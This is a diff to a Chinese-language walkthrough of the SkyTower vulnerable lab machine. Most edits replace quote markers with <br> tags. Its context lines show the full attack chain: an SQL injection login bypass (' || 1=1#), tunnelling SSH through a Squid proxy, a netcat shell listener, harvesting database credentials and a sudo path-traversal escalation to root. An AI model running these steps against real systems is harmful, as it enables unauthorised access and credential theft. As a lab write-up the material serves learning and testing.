@@ -28,7 +28,7 @@ HOP RTT     ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 42.11 seconds
 ```
->可以看到开放了22端口, 80端口, 还有一个3128端口
+<br>可以看到开放了22端口, 80端口, 还有一个3128端口
 
 ```
 ─$ dirsearch -u "http://192.168.146.71/"                                                               
@@ -74,29 +74,29 @@ Task Completed
 >通过使用dirsearch扫描, 只发现了主页的三个目录, 访问一下主页看看有什么东西
 
 ![Img](../FILES/SkyTower/img-20220712144859.png)
->发现一个登录界面, 并且没有验证码, 跟以往一样, 先试试sql注入
-我在Email里面输入admin, 在password里面写一个', 试试是否有sql注入
+<br>发现一个登录界面, 并且没有验证码, 跟以往一样, 先试试sql注入
+<br>我在Email里面输入admin, 在password里面写一个', 试试是否有sql注入
 
 ![Img](../FILES/SkyTower/img-20220712145008.png)
-> 报错了, 看来有sql注入
-那就试试万能密码
+<br>报错了, 看来有sql注入
+<br>那就试试万能密码
 ```
 ' || 1=1#
 ```
 ![Img](../FILES/SkyTower/img-20220712145105.png)
->怎么总感觉那么顺利又感觉掉进坑里了呢...
-anyway先尝试一下ssh登录
+<br>怎么总感觉那么顺利又感觉掉进坑里了呢...
+<br>anyway先尝试一下ssh登录
 
 ![Img](../FILES/SkyTower/img-20220712145316.png)
->发现没办法登录, 这时候我们回顾一下nmap的扫描结果
+<br>发现没办法登录, 这时候我们回顾一下nmap的扫描结果
 
 ![Img](../FILES/SkyTower/img-20220712145359.png)
->你可以发现ssh的端口state是被过滤的, 那么我们就要使用proxytunnel去把3128作为代理, 到我们本地试试了
+<br>你可以发现ssh的端口state是被过滤的, 那么我们就要使用proxytunnel去把3128作为代理, 到我们本地试试了
 ```
 proxytunnel -p 192.168.146.71:3128 -d 127.0.0.1:22 -a 5555
 ```
 ![Img](../FILES/SkyTower/img-20220712145858.png)
->我在登录上去之后的瞬间就被断开了连接, 这里把我整不会了, 于是我换了个思路, 使用反弹shell
+<br>我在登录上去之后的瞬间就被断开了连接, 这里把我整不会了, 于是我换了个思路, 使用反弹shell
 首先用/etc/proxychains4.conf加入RHOST
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.71]
@@ -126,8 +126,8 @@ Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
                                                                                                                                
 
 ```
->成功了
-接下来使用nc配合ssh登录
+<br>成功了
+<br>接下来使用nc配合ssh登录
 ```
 Terminal1:
 nc -nvlp 4444             
@@ -145,7 +145,7 @@ john@127.0.0.1's password:
 >这样Terminal1就得到了反弹回来的数据
 
 ![Img](../FILES/SkyTower/img-20220712152044.png)
->然后就开始在本机上搜索, 先去web目录看一下
+<br>然后就开始在本机上搜索, 先去web目录看一下
 ```
 cd /var/www
 ls
@@ -154,8 +154,8 @@ background.jpg
 index.html
 login.php
 ```
->看到一个login.php文件
-查看一下内容
+<br>看到一个login.php文件
+<br>查看一下内容
 
 ```
 cat login.php
@@ -215,8 +215,8 @@ echo "</HTML>"
 ?>
 
 ```
-> 下面那些都不重要了, 我们只要最顶上的$db = new mysqli('localhost', 'root', 'root', 'SkyTech');
-但是由于现在我们还是一个没有可交互式的命令行, 我们回到主目录下看看其他的文件看看有没有什么思路
+<br>下面那些都不重要了, 我们只要最顶上的$db = new mysqli('localhost', 'root', 'root', 'SkyTech');
+<br>但是由于现在我们还是一个没有可交互式的命令行, 我们回到主目录下看看其他的文件看看有没有什么思路
 
 ```
 cd 
@@ -346,7 +346,7 @@ echo  "Funds have been withdrawn"
 exit
 
 ```
->我观察到了.bashrc里面的最后一行, 就是因为这个文件导致我无法登录, 那我就直接在ssh登录的时候把.bashrc删掉就好了
+<br>我观察到了.bashrc里面的最后一行, 就是因为这个文件导致我无法登录, 那我就直接在ssh登录的时候把.bashrc删掉就好了
 ```
 Terminal1:
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.71]
@@ -372,7 +372,7 @@ Last login: Tue Jul 12 03:16:23 2022 from localhost
 john@SkyTower:~$ 
 
 ```
-> 这样我们就上来了, 接下来就是登录数据库了
+<br>这样我们就上来了, 接下来就是登录数据库了
 ```
 john@SkyTower:~$ mysql -uroot -p
 Enter password: 
@@ -423,8 +423,8 @@ mysql> select * from login;
 3 rows in set (0.00 sec)
 
 ```
-> 拿到两个新用户的密码
-> 继续使用ssh登录
+<br>拿到两个新用户的密码
+<br>继续使用ssh登录
 
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.71]
@@ -462,7 +462,7 @@ Last login: Tue Jul 12 03:33:22 2022 from localhost
 sara@SkyTower:~$ 
 
 ```
->一样的套路再用就不礼貌了啊...
+<br>一样的套路再用就不礼貌了啊...
 在本地开个httpserver, 使用linpeas.sh查看一下有用的信息
 ```
 └─$ sudo python3 -m http.server 80               
@@ -485,7 +485,7 @@ sara@SkyTower:~$ ls
 linpeas.sh
 sara@SkyTower:~$ bash linpeas.sh 
 ```
->观察到Users Information有以下内容
+<br>观察到Users Information有以下内容
 ```
 ═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════
                                          ╚═══════════════════╝
@@ -508,7 +508,7 @@ User sara may run the following commands on this host:
     (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
 
 ```
->这个用户可以使用/account*查看root的东西
+<br>这个用户可以使用/account*查看root的东西
 ```
 sara@SkyTower:~$ sudo cat /accounts/*
 cat: /accounts/*: No such file or directory
@@ -520,7 +520,7 @@ sara@SkyTower:~$ sudo ls /accounts/../root
 flag.txt
 sara@SkyTower:~$ 
 ```
->看到了一个flag.txt
+<br>看到了一个flag.txt
 ```
 sara@SkyTower:~$ sudo ls /accounts/../root
 flag.txt
@@ -532,7 +532,7 @@ root password is theskytower
 sara@SkyTower:~$ 
 
 ```
->拿到root密码!
+<br>拿到root密码!
 ```
 sara@SkyTower:~$ su root
 Password: 
